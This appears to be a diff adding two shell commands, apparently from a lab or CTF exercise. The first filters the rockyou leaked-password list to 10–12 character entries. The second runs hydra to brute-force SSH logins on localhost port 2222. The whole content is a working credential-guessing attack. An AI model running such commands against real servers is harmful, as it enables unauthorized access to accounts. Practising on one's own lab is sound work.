@@ -1,0 +1,3 @@
+cat rockyou.txt | sort | uniq | pw-inspector -m 10 -M 12 > passwords.txt
+hydra -L user_authenticating_into_server -P passwords.txt 127.0.0.1 -s 2222 ssh -t 4
+
